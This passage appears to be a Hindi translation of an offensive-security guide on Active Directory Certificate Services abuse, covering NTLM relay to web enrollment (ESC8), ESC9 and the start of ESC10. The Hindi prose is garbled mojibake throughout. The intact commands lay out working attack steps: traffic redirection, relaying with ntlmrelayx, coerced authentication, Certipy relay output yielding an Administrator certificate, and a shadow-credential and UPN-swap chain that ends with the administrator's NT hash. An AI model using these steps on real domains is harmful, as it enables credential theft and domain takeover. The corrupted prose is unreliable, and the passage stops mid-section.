рдХрдИ **рдПрдбреА рд╕реАрдПрд╕ рджреНрд╡рд╛рд░рд╛ рд╕рдорд░реНрдерд┐рдд рдПрдЪрдЯреАрдЯреАрдкреА рдкрд░ рдЖрдзрд╛рд░рд┐рдд рдирд╛рдорд╛рдВрдХрди рд╡рд┐рдзрд┐рдпрд╛рдБ** рд╣реИрдВ, рдЬрд┐рдиреНрд╣реЗрдВ рдкреНрд░рд╢рд╛рд╕рдХ рд╕реНрдерд╛рдкрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдпреЗ рдПрдЪрдЯреАрдЯреАрдкреА рдкрд░ рдЖрдзрд╛рд░рд┐рдд рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдирд╛рдорд╛рдВрдХрди рдХреЗ рдЗрдВрдЯрд░рдлреЗрд╕ **NTLM рд░рд┐рд▓реЗ рд╣рдорд▓реЛрдВ** рдХреЗ рд▓рд┐рдП рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╣реИрдВред рдПрдХ рд╣рдорд▓рд╛рд╡рд░, **рдХрдВрдкреНрд░рдорд╛рдЗрдЬрд╝ рдХрд┐рдП рдЧрдП рдорд╢реАрди рд╕реЗ, рдХрд┐рд╕реА рднреА рдПрдбреА рдЦрд╛рддрд╛ рдХрд╛ рдЕрдиреБрдХрд░рдг рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ рдЗрдирдмрд╛рдЙрдВрдб NTLM рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкреНрд░рдорд╛рдгреАрдХреГрдд рд╣реЛрддрд╛ рд╣реИ**ред рд╢рд┐рдХрд╛рд░ рдЦрд╛рддрд╛ рдХрд╛ рдЕрдиреБрдХрд░рдг рдХрд░рддреЗ рд╣реБрдП, рдЗрди рд╡реЗрдм рдЗрдВрдЯрд░рдлреЗрд╕ рдХреЛ рд╣рдорд▓рд╛рд╡рд░ рджреНрд╡рд╛рд░рд╛ рдПрдХ рдЧреНрд░рд╛рд╣рдХ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ `рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛` рдпрд╛ `рдорд╢реАрди` рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЯреЗрдореНрдкрд▓реЗрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реБрдПред

* **рд╡реЗрдм рдирд╛рдорд╛рдВрдХрди рдЗрдВрдЯрд░рдлреЗрд╕** (рдПрдХ рдкреБрд░рд╛рдирд╛ рдПрдПрд╕рдкреА рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдЬреЛ `http://<caserver>/certsrv/` рдкрд░ рдЙрдкрд▓рдмреНрдз рд╣реИ), рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдХреЗрд╡рд▓ HTTP рдкрд░ рд╣реИ, рдЬреЛ NTLM рд░рд┐рд▓реЗ рд╣рдорд▓реЛрдВ рдХреЗ рдЦрд┐рд▓рд╛рдл рд╕реБрд░рдХреНрд╖рд╛ рдирд╣реАрдВ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ред рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, рдпрд╣ рдЕрдкрдиреЗ рдЕрдзрд┐рдХрд╛рд░рдг HTTP рд╣реЗрдбрд░ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдХреЗрд╡рд▓ NTLM рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдХрд┐ рдХрд░реНрдмреЗрд░реЛрд╕ рдЬреИрд╕реЗ рдЕрдзрд┐рдХ рд╕реБрд░рдХреНрд╖рд┐рдд рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд╡рд┐рдзрд┐рдпрд╛рдБ рд▓рд╛рдЧреВ рдирд╣реАрдВ рд╣реЛрддреАрдВред
* **рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдирд╛рдорд╛рдВрдХрди рд╕реЗрд╡рд╛** (рд╕реАрдИрдПрд╕), **рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдирд╛рдорд╛рдВрдХрди рдиреАрддрд┐** (рд╕реАрдИрдкреА) рд╡реЗрдм рд╕реЗрд╡рд╛, рдФрд░ **рдиреЗрдЯрд╡рд░реНрдХ рдЙрдкрдХрд░рдг рдирд╛рдорд╛рдВрдХрди рд╕реЗрд╡рд╛** (рдПрдирдбреАрдИрдПрд╕) рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдЕрдкрдиреЗ рдЕрдзрд┐рдХрд╛рд░рдг HTTP рд╣реЗрдбрд░ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдиреЗрдЧреЛрдЯрд┐рдПрдЯ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддреЗ рд╣реИрдВред рдиреЗрдЧреЛрдЯрд┐рдПрдЯ рдкреНрд░рдорд╛рдгреАрдХрд░рдг **рджреЛрдиреЛрдВ** рдХрд░реНрдмреЗрд░реЛрд╕ рдФрд░ **NTLM** рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рд╣рдорд▓рд╛рд╡рд░ NTLM рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдореЗрдВ **рдбрд╛рдЙрдирдЧреНрд░реЗрдб** рдХрд░ рд╕рдХрддрд╛ рд╣реИред рд╣рд╛рд▓рд╛рдВрдХрд┐ рдпреЗ рд╡реЗрдм рд╕реЗрд╡рд╛рдПрдБ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ HTTPS рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддреА рд╣реИрдВ, HTTPS рдХреЗрд╡рд▓ рд╕реНрд╡рдпрдВ NTLM рд░рд┐рд▓реЗ рд╣рдорд▓реЛрдВ рдХреЗ рдЦрд┐рд▓рд╛рдл рд╕реБрд░рдХреНрд╖рд┐рдд рдирд╣реАрдВ рд╣реИред HTTPS рд╕реЗрд╡рд╛рдУрдВ рдХреЗ рд▓рд┐рдП NTLM рд░рд┐рд▓реЗ рд╣рдорд▓реЛрдВ рд╕реЗ рд╕реБрд░рдХреНрд╖рд╛ рдХреЗрд╡рд▓ рддрдм рд╕рдВрднрд╡ рд╣реИ рдЬрдм HTTPS рдХреЛ рдЪреИрдирд▓ рдмрд╛рдЗрдВрдбрд┐рдВрдЧ рдХреЗ рд╕рд╛рде рд╕рдВрдпреБрдХреНрдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рджреБрд░реНрднрд╛рдЧреНрдп рд╕реЗ, рдПрдбреА рд╕реАрдПрд╕ рдЖрдИрдЖрдИрдПрд╕ рдкрд░ рд╡рд┐рд╕реНрддрд╛рд░рд┐рдд рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рд▓рд┐рдП рдПрдХреНрдЯрд┐рд╡реЗрдЯ рдирд╣реАрдВ рдХрд░рддрд╛, рдЬреЛ рдЪреИрдирд▓ рдмрд╛рдЗрдВрдбрд┐рдВрдЧ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рд╣реИред

NTLM рд░рд┐рд▓реЗ рд╣рдорд▓реЛрдВ рдХреА рдПрдХ рд╕рд╛рдорд╛рдиреНрдп **рд╕рдорд╕реНрдпрд╛** рд╣реИ **NTLM рд╕рддреНрд░реЛрдВ рдХреА рдЕрд▓реНрдкрдХрд╛рд▓рд┐рдХрддрд╛** рдФрд░ рд╣рдорд▓рд╛рд╡рд░ рдХреА рд╕реЗрд╡рд╛рдУрдВ рдХреЗ рд╕рд╛рде рдмрд╛рддрдЪреАрдд рдХрд░рдиреЗ рдХреА рдЕрд╕рдорд░реНрдерддрд╛ рдЬреЛ **NTLM рд╕рд╛рдЗрдирд┐рдВрдЧ** рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИред
рдлрд┐рд░ рднреА, рдЗрд╕ рд╕реАрдорд╛ рдХреЛ рдЙрдкреЗрдХреНрд╖рд╛ рдХрд░рдХреЗ рдПрдХ рдПрдирдЯреАрдПрд▓рдПрдо рд░рд┐рд▓реЗ рд╣рдорд▓рд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рд╕реЗ рдпрд╣ рд╕реАрдорд╛ рдкрд╛рд░ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИ, рдХреНрдпреЛрдВрдХрд┐ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХреА рдорд╛рдиреНрдпрддрд╛ рдЕрд╡рдзрд┐ рд╕рддреНрд░ рдХреА рдЕрд╡рдзрд┐ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд░рддреА рд╣реИ, рдФрд░ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХреЛ рд╕реЗрд╡рд╛рдУрдВ рдХреЗ рд╕рд╛рде рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ **рдПрдирдЯреАрдПрд▓рдПрдо рд╕рд╛рдЗрдирд┐рдВрдЧ рдХреЛ рдЕрдирд┐рд╡рд╛рд░реНрдп рдмрдирд╛рддреА рд╣реИ**ред рдЪреБрд░рд╛рдП рдЧрдП рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рдирд┐рд░реНрджреЗрд╢реЛрдВ рдХреЗ рд▓рд┐рдП, рджреЗрдЦреЗрдВ:

{% content-ref url="account-persistence.md" %}
[account-persistence.md](account-persistence.md)
{% endcontent-ref %}

рдПрдирдЯреАрдПрд▓рдПрдо рд░рд┐рд▓реЗ рд╣рдорд▓реЛрдВ рдХреА рдПрдХ рдФрд░ рд╕реАрдорд╛ рдпрд╣ рд╣реИ рдХрд┐ **рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдирд┐рдпрдВрддреНрд░рд┐рдд рдорд╢реАрди рдХреЛ рдПрдХ рдкреАрдбрд╝рд┐рдд рдЦрд╛рддрд╛ рджреНрд╡рд╛рд░рд╛ рдкреНрд░рдорд╛рдгрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП**ред рд╣рдорд▓рд╛рд╡рд░ рдЗрд╕ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХрд╛ рдЗрдВрддрдЬрд╛рд░ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдпрд╛ рдЗрд╕ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЛ **рдмрд▓рдкреВрд░реНрд╡рдХ** рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддрд╛ рд╣реИ:

{% content-ref url="../printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../printers-spooler-service-abuse.md)
{% endcontent-ref %}

### **рджреБрд░реБрдкрдпреЛрдЧ**

[**Certify**](https://github.com/GhostPack/Certify) рдХрд╛ `cas` **рд╕рдХреНрд╖рдо HTTP AD CS рдЕрдВрддреНрдпрд╕реНрдерд╛рдиреЛрдВ** рдХреА рдЬрд╛рдВрдЪ рдХрд░рддрд╛ рд╣реИ:
```
Certify.exe cas
```
<figure><img src="../../../.gitbook/assets/image (69).png" alt=""><figcaption></figcaption></figure>

`msPKI-Enrollment-Servers` рдЧреБрдгрд╕реВрддреНрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдЙрджреНрдпрдо рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдкреНрд░рд╛рдзрд┐рдХрд░рдгреЛрдВ (CAs) рджреНрд╡рд╛рд░рд╛ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдкрдВрдЬреАрдХрд░рдг рд╕реЗрд╡рд╛ (CES) рдЗрдВрдбрдкреЙрдЗрдВрдЯреНрд╕ рд╕реНрдЯреЛрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЗрди рдЗрдВрдбрдкреЙрдЗрдВрдЯреНрд╕ рдХреЛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЙрдкрдХрд░рдг **Certutil.exe** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕реВрдЪреАрдмрджреНрдз рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../.gitbook/assets/image (754).png" alt=""><figcaption></figcaption></figure>
```powershell
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../.gitbook/assets/image (937).png" alt=""><figcaption></figcaption></figure>

#### рдкреНрд░рдорд╛рдгрд┐рдд рдХреЗ рд╕рд╛рде рджреБрд░реБрдкрдпреЛрдЧ
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### [Certipy](https://github.com/ly4k/Certipy) рдХреЗ рд╕рд╛рде рджреБрд░реБрдкрдпреЛрдЧ

рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдХрд╛ рдЕрдиреБрд░реЛрдз рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ Certipy рджреНрд╡рд╛рд░рд╛ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬреЛ рдЯреЗрдореНрдкреНрд▓реЗрдЯ `Machine` рдпрд╛ `User` рдкрд░ рдЖрдзрд╛рд░рд┐рдд рд╣реЛрддрд╛ рд╣реИ, рдЬреЛ рдпрд╣ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдХреНрдпрд╛ рдЦрд╛рддрд╛ рдирд╛рдо `$` рд╕реЗ рд╕рдорд╛рдкреНрдд рд╣реЛ рд░рд╣рд╛ рд╣реИред рдПрдХ рд╡реИрдХрд▓реНрдкрд┐рдХ рдЯреЗрдореНрдкреНрд▓реЗрдЯ рдХрд╛ рдирд┐рд░реНрдзрд╛рд░рдг `-template` рдкреИрд░рд╛рдореАрдЯрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

[PetitPotam](https://github.com/ly4k/PetitPotam) рдЬреИрд╕реА рдПрдХ рддрдХрдиреАрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдлрд┐рд░ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬрд┐рд╕рд╕реЗ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЛ рдордЬрдмреВрд░ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдЬрдм рдбреЛрдореЗрди рдХрдВрдЯреНрд░реЛрд▓рд░реНрд╕ рдХреЗ рд╕рд╛рде рдХрд╛рдо рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реЛ, рддреЛ `-template DomainController` рдХрд╛ рдирд┐рд░реНрдзрд╛рд░рдг рдЖрд╡рд╢реНрдпрдХ рд╣реИред
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## рдХреЛрдИ рд╕реБрд░рдХреНрд╖рд╛ рдПрдХреНрд╕рдЯреЗрдВрд╢рди - ESC9 <a href="#id-5485" id="id-5485"></a>

### рд╕реНрдкрд╖реНрдЯреАрдХрд░рдг

рдирдП рдорд╛рди **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) рдХреЗ рд▓рд┐рдП **`msPKI-Enrollment-Flag`** рдХреЗ рд▓рд┐рдП, рдЬрд┐рд╕реЗ ESC9 рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИ, рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдореЗрдВ **рдирдИ `szOID_NTDS_CA_SECURITY_EXT` рд╕реБрд░рдХреНрд╖рд╛ рдПрдХреНрд╕рдЯреЗрдВрд╢рди** рдХреЛ рд╕рдорд╛рд╣рд┐рдд рдХрд░рдиреЗ рд╕реЗ рд░реЛрдХрддрд╛ рд╣реИред рдпрд╣ рдзреНрд╡рдЬ `StrongCertificateBindingEnforcement` рдХреЛ `1` рдкрд░ рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ (рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╕реЗрдЯрд┐рдВрдЧ), рдЬреЛ `2` рдкрд░ рд╕реЗрдЯрд┐рдВрдЧ рдХреЗ рд╕рд╛рде рд╡рд┐рдкрд░реАрдд рд╣реИред рдЗрд╕рдХрд╛ рдорд╣рддреНрд╡ рдЙрдЪрд┐рдд рд╣реЛрддрд╛ рд╣реИ рдЬрдм рдХрд┐рд╕реА рдХрдордЬреЛрд░ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдореИрдкрд┐рдВрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдХреЗрд░рдмреЗрд░реЛрд╕ рдпрд╛ рд╢реИрдирд▓ рдХреЗ рд▓рд┐рдП (рдЬреИрд╕реЗ ESC10 рдореЗрдВ), рдХреНрдпреЛрдВрдХрд┐ ESC9 рдХреА рдЕрдиреБрдкрд╕реНрдерд┐рддрд┐ рдЖрд╡рд╢реНрдпрдХрддрд╛рдУрдВ рдХреЛ рдмрджрд▓ рдирд╣реАрдВ рд╕рдХрддреАред

рдЗрд╕ рдзреНрд╡рдЬ рдХреА рд╕реЗрдЯрд┐рдВрдЧ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реЛрдиреЗ рдХреА рд╕реНрдерд┐рддрд┐рдпрд╛рдБ рд╢рд╛рдорд┐рд▓ рд╣реИрдВ:

* `StrongCertificateBindingEnforcement` рдХреЛ `2` рдкрд░ рд╕рдорд╛рдпреЛрдЬрд┐рдд рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ (рдЬрд┐рд╕рдХрд╛ рдбрд┐рдлрд╝реЙрд▓реНрдЯ `1` рд╣реИ), рдпрд╛ `CertificateMappingMethods` рдореЗрдВ `UPN` рдзреНрд╡рдЬ рд╢рд╛рдорд┐рд▓ рд╣реИред
* рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХреЛ `msPKI-Enrollment-Flag` рд╕реЗрдЯрд┐рдВрдЧ рдХреЗ рднреАрддрд░ `CT_FLAG_NO_SECURITY_EXTENSION` рдзреНрд╡рдЬ рд╕реЗ рдЪрд┐рд╣реНрдирд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред
* рдХреЛрдИ рднреА рдХреНрд▓рд╛рдЗрдВрдЯ рдкреНрд░рдорд╛рдгреАрдХрд░рдг EKU рдкреНрд░рдорд╛рдгрдкрддреНрд░ рджреНрд╡рд╛рд░рд╛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред
* рдХрд┐рд╕реА рднреА рдЦрд╛рддреЗ рдкрд░ `GenericWrite` рдЕрдиреБрдорддрд┐рдпрд╛рдБ рдЙрдкрд▓рдмреНрдз рд╣реИрдВ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрд┐рд╕реА рдЕрдиреНрдп рдХреЛ рдХрдордЬреЛрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред

### рджреБрд░реБрдкрдпреЛрдЧ рд╕реНрдерд┐рддрд┐

рдорд╛рди рд▓реЗрдВ рдХрд┐ `John@corp.local` рдХреЗ рдкрд╛рд╕ `Jane@corp.local` рдкрд░ `GenericWrite` рдЕрдиреБрдорддрд┐рдпрд╛рдБ рд╣реИрдВ, рдЬрд┐рдирдХрд╛ рд▓рдХреНрд╖реНрдп `Administrator@corp.local` рдХреЛ рдХрдордЬреЛрд░ рдХрд░рдирд╛ рд╣реИред `ESC9` рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЯреЗрдореНрдкрд▓реЗрдЯ, рдЬрд┐рд╕реЗ `Jane@corp.local` рдХреЛ рдирд╛рдорд╛рдВрдХрд┐рдд рд╣реЛрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реИ, рдЗрд╕рдХреА `msPKI-Enrollment-Flag` рд╕реЗрдЯрд┐рдВрдЧ рдореЗрдВ `CT_FLAG_NO_SECURITY_EXTENSION` рдзреНрд╡рдЬ рдХреЗ рд╕рд╛рде рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред

рд╢реБрд░реВ рдореЗрдВ, `Jane` рдХрд╛ рд╣реИрд╢ рд╢реИрдбреЛ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ `John` рдХреЗ рджреНрд╡рд╛рд░рд╛ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
рдЗрд╕рдХреЗ рдмрд╛рдж, `Jane` рдХрд╛ `userPrincipalName` `Administrator` рдореЗрдВ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, `@corp.local` рдбреЛрдореЗрди рд╣рд┐рд╕реНрд╕рд╛ рдЬрд╛рдирдмреВрдЭрдХрд░ рдЫреЛрдбрд╝ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
рдпрд╣ рд╕рдВрд╢реЛрдзрди рдмрд╛рдзрд╛рдПрдБ рдЙрд▓реНрд▓рдВрдШрд┐рдд рдирд╣реАрдВ рдХрд░рддрд╛ рд╣реИ, рдХреНрдпреЛрдВрдХрд┐ `Administrator@corp.local` рдХреЛ `Administrator` рдХрд╛ `userPrincipalName` рдЕрд▓рдЧ рд░реВрдк рд╕реЗ рдмрдирд╛ рд░рд╣рддрд╛ рд╣реИред

рдЗрд╕рдХреЗ рдмрд╛рдж, `ESC9` рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЯреЗрдореНрдкрд▓реЗрдЯ, рдЬрд┐рд╕реЗ рд╡рдВрд╢рд╛рд╡рд╢реЗрд╖рд┐рдд рдорд╛рдирд╛ рдЧрдпрд╛ рд╣реИ, `Jane` рдХреЗ рд░реВрдк рдореЗрдВ рдЕрдиреБрд░реЛрдз рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
рдпрд╣ рдиреЛрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдХрд┐ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХрд╛ `userPrincipalName` `Administrator` рдХреЛ рдкреНрд░рдХрдЯ рдХрд░рддрд╛ рд╣реИ, рдХрд┐рд╕реА рднреА "рдСрдмреНрдЬреЗрдХреНрдЯ SID" рдХреЗ рдмрд┐рдирд╛ред

`Jane` рдХрд╛ `userPrincipalName` рдлрд┐рд░ рд╕реЗ рдЙрд╕рдХреЗ рдореВрд▓, `Jane@corp.local` рдкрд░ рд▓реМрдЯрд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
рдкреНрд░рдХрд╛рд░рд┐рдд рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХреЗ рд╕рд╛рде рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдЕрдм `Administrator@corp.local` рдХрд╛ NT рд╣реИрд╢ рджреЗрддрд╛ рд╣реИред рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХреЗ рдбреЛрдореЗрди рд╡рд┐рд╢рд┐рд╖реНрдЯреАрдХрд░рдг рдХреА рдХрдореА рдХреЗ рдХрд╛рд░рдг рдЖрдЬреНрдЮрд╛ рдореЗрдВ `-domain <domain>` рд╢рд╛рдорд┐рд▓ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП:
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
## рджреБрд░реНрдмрд▓ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдореИрдкрд┐рдВрдЧ - ESC10

### рд╡реНрдпрд╛рдЦреНрдпрд╛

рдбреЛрдореЗрди рдХрдВрдЯреНрд░реЛрд▓рд░ рдкрд░ рджреЛ рд░рдЬрд┐рд╕реНрдЯреНрд░реА рдХреБрдВрдЬреА рдорд╛рди ESC10 рджреНрд╡рд╛рд░рд╛ рд╕рдВрджрд░реНрднрд┐рдд рд╣реИрдВ:

* `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` рдХреЗ рддрд╣рдд `CertificateMappingMethods` рдХреЗ рд▓рд┐рдП рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдорд╛рди `0x18` (`0x8 | 0x10`) рд╣реИ, рдкрд╣рд▓реЗ `0x1F` рдкрд░ рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ред
* `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` рдХреЗ рддрд╣рдд `StrongCertificateBindingEnforcement` рдХреЗ рд▓рд┐рдП рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╕реЗрдЯрд┐рдВрдЧ `1` рд╣реИ, рдкрд╣рд▓реЗ `0` рдерд╛ред

**рдорд╛рдорд▓рд╛ 1**

рдЬрдм `StrongCertificateBindingEnforcement` рдХреЛ `0` рдХреЗ рд░реВрдк рдореЗрдВ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

**рдорд╛рдорд▓рд╛ 2**

рдпрджрд┐ `CertificateMappingMethods` рдореЗрдВ `UPN` рдмрд┐рдЯ (`0x4`) рд╢рд╛рдорд┐рд▓ рд╣реИред

### рджреБрд░реБрдкрдпреЛрдЧ рдорд╛рдорд▓рд╛ 1

`StrongCertificateBindingEnforcement` рдХреЛ `0` рдХреЗ рд░реВрдк рдореЗрдВ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░рдиреЗ рдкрд░, рдПрдХ рдЦрд╛рддрд╛ A рдЬрд┐рд╕рдореЗрдВ `GenericWrite` рдЕрдиреБрдорддрд┐рдпрд╛рдБ рд╣реИрдВ, рдХрд┐рд╕реА рднреА рдЦрд╛рддрд╛ B рдХреЛ рдХрдВрдкреНрд░реЛрдорд╛рдЗрдЬрд╝ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

